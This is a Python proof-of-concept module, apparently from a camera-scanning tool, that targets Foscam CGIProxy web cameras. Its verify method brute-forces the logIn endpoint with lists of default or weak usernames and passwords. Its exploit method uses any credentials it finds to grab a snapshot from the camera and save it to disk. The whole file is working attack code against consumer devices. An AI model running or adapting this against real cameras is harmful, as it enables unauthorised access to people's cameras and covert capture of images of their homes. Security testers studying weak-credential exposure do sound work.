"""Foscam / generic CGIProxy camera weak password."""
from loguru import logger
from .base import POCTemplate


class FoscamWeakPassword(POCTemplate):
    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product.get("foscam", "foscam")
        self.level = POCTemplate.level.medium
        self.desc = "Foscam CGIProxy.fcgi logIn with default/weak credentials."

    def verify(self, ip, port=80):
        headers = {"User-Agent": self.config.user_agent}
        for user in self.config.users:
            for password in self.config.passwords:
                path = (f"/cgi-bin/CGIProxy.fcgi?cmd=logIn"
                        f"&usr={user}&pwd={password}")
                try:
                    r = self.session.get(
                        self.url(ip, port, path),
                        headers=headers, timeout=self.config.timeout,
                        verify=False)
                    if r.status_code != 200:
                        continue
                    # result 0 = success; result -2 / -3 = bad user/pass
                    if "<result>0</result>" in r.text or '"result":0' in r.text:
                        return ip, str(port), self.product, user, password, self.name
                except Exception as e:
                    logger.error(e)
        return None

    def exploit(self, results):
        ip, port, product, user, password, vul = results
        path = (f"/cgi-bin/CGIProxy.fcgi?cmd=snapPicture2"
                f"&usr={user}&pwd={password}")
        return self._snapshot(
            self.url(ip, port, path),
            f"{ip}-{port}-{user}-{password}-foscam.jpg")


POCTemplate.register_poc(FoscamWeakPassword)
